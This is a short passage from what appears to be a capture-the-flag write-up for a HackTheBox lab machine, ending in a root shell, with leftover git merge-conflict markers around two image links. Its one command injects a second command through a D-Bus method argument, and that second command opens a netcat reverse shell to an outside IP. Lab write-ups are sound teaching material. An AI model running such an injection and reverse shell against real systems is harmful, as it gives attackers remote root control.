...
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.14.29 666 \>/tmp/.0;"  
![dbus-send](/assets/img/oouch/oouch41.png)  
<<<<<<< HEAD
![root](/assets/img/oouch/oouch40.png) 
=======
![root](/assets/img//oouch/oouch40.png) 
>>>>>>> 76db649824ecc12be9bb4235533965ed32e5c886
